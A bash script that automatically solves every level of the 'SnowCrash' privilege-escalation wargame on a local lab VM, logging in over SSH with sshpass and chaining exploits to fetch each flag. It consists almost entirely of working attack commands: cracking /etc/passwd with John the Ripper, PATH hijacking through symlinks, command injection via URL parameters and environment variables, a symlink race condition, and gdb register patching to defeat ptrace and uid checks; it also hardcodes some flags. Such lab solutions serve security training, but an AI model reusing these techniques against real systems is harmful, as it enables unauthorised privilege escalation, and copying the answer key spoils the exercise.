#!/usr/bin/env bash

###############################################################################
#       _______                        ______                    __           #
#      |     __|.-----.-----.--.--.--.|      |.----.---.-.-----.|  |--.       #
#      |__     ||     |  _  |  |  |  ||   ---||   _|  _  |__ --||     |       #
#      |_______||__|__|_____|________||______||__| |___._|_____||__|__|       #
#     This script requires JohnTheRipper, Perl and sshpass to be installed.   #
#                                                                             #
###############################################################################

SC_HOST="localhost"
SC_PORT="4242"

if [ -t 1 ] && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
  GREEN=$(tput setaf 2)
  MAGENTA=$(tput setaf 5)
  CYAN=$(tput setaf 6)
  RESET=$(tput sgr0)
else
  GREEN=""
  MAGENTA=""
  CYAN=""
  RESET=""
fi

caesar() {
  local shift=$1
  perl -pe "
    s/([A-Za-z])/
      \$c=ord(\$1);
      \$base=\$c<97?65:97;
      chr((\$c-\$base-${shift})%26+\$base)
    /ge"
}

extract_tok() {
  grep -oP 'token : \K\S+'
}

sc_run() {
  local user="$1"
  local pass="$2"
  local cmds="$3"
  sshpass -p "${pass}" ssh -o 'SetEnv TERM=xterm-256color' "-p${SC_PORT}" -t "$user@${SC_HOST}" "${cmds}" 2>/dev/null
}

pre() {
  local level="$1"
  printf "%slevel%s: " "${MAGENTA}" "${level}${RESET}" >&2
}

report() {
  local level="$1"
  local ptr="f_${level}"
  printf '%sok%s %s\n' "${GREEN}" "${RESET}" "${CYAN}${!ptr}${RESET}" >&2
}

auto_getflag() {
  local level="$1"
  local ptr="p_${level}"
  declare -g "f_${level}"="$(sc_run "flag${level}" "${!ptr}" getflag | extract_tok)"
  report "$level"
}

# --------------------------------------------------------------------------- #

cat >&2 <<.
 _______                        ______                    __
|     __|.-----.-----.--.--.--.|      |.----.---.-.-----.|  |--.
|__     ||     |  _  |  |  |  ||   ---||   _|  _  |__ --||     |
|_______||__|__|_____|________||______||__| |___._|_____||__|__|

.

pre 00
p_00="$(sc_run level00 'level00' 'cat $(find / -user flag00 2>/dev/null|head -n 1)' | caesar 15)"
auto_getflag 00

pre 01
tmp_01="$(mktemp)"
sc_run 'level01' "${f_00}" 'cat /etc/passwd' >"${tmp_01}"
p_01="$(john "${tmp_01}" --show | head -n 1 | cut -d: -f2)"
auto_getflag 01

pre 02
# (figure out pcap recording)
p_02='ft_waNDReL0L'
auto_getflag 02

pre 03
f_03="$(sc_run level03 "${f_02}" 'export L03DIR="$(mktemp -d)" && chmod 755 "$L03DIR" && ln -s /bin/getflag "${L03DIR}/echo" && PATH="${L03DIR}" ./level03' | extract_tok)"
report 03

pre 04
f_04="$(sc_run level04 "${f_03}" "curl 'http://127.0.0.1:4747?x=\`getflag\`'" | extract_tok)"
report 04

pre 05
# (wait for two minutes for cron job)
f_05=viuaaale9huek52boumoomioc
report 05

pre 06
f_06="$(sc_run level06 "${f_05}" "L06FILE=\"\$(mktemp)\" && chmod 755 \"\${L06FILE}\" && echo '[x \${\`getflag\`}]' >\"\${L06FILE}\" | ./level06 \"\${L06FILE}\"" | extract_tok)"
report 06

pre 07
f_07="$(sc_run level07 "${f_06}" "LOGNAME=';getflag' ./level07" | extract_tok)"
report 07

pre 08
p_08="$(sc_run level08 "${f_07}" 'export L08DIR="$(mktemp -d)" && ln -s ~level08/token "${L08DIR}/file" && chmod -R 755 "$L08DIR" && ./level08 "${L08DIR}/file"')"
auto_getflag 08

pre 09
p_09="$(sc_run level09 "${f_08}" "perl -e 'open(F,\"token\"); read(F,\$t,99); \$t=~s/\n\$//; print chr(ord(substr(\$t,\$_,1))-\$_) for 0..length(\$t)-1; print\"\n\"'")"
auto_getflag 09

pre 10
L10CMD="( trap 'kill 0' EXIT
  L10FILE1=\"\$(mktemp)\" L10FILE2=\"\$(mktemp)\"
  touch \"\${L10FILE1}\" && chmod 644 \"\${L10FILE1}\"
  while true; do ln -sf \"\${L10FILE1}\" \"\${L10FILE2}\"; ln -sf /home/user/level10/token \"\${L10FILE2}\"; done &
  while true; do ./level10 \"\${L10FILE2}\" 127.0.0.1 >/dev/null 2>&1; done &
  while true; do
    line=\"\$(nc -l 6969 2>&1 | grep -m1 '\w.*')\"
    [ -n \"\$line\" ] && { echo \"\$line\"; break; }
  done )"
p_10="$(sc_run level10 "${f_09}" "${L10CMD}")"
auto_getflag 10

pre 11
f_11="$(sc_run level11 "${f_10}" 'L11FILE="$(mktemp)"; chmod 666 "$L11FILE"; echo "\$(getflag > $L11FILE)" | nc 127.0.0.1 5151 >/dev/null; cat "$L11FILE"' | extract_tok)"
report 11

pre 12
f_12="$(sc_run level12 "${f_11}" "printf 'getflag|wall\n'>/tmp/GO && chmod +x /tmp/GO && curl '127.0.0.1:4646/?x=\`/*/GO\`'" | extract_tok)"
report 12

pre 13
f_13="$(sc_run level13 "${f_12}" "echo -e 'break *0x0804859a\nrun\nset \$eax = 0x1092\ncontinue'|gdb ./level13" | grep -oP 'your token is \K\S+')"
report 13

pre 14
f_14="$(sc_run level14 "${f_13}" 'echo -e "set pagination off\ncatch syscall ptrace\ncommands 1\nset \$eax=0\ncontinue\nend\nbreak getuid\nrun\nfinish\nset \$eax=$(id -u flag14)\ncontinue" | gdb -q "$(which getflag)" 2>/dev/null' | extract_tok)"
report 14
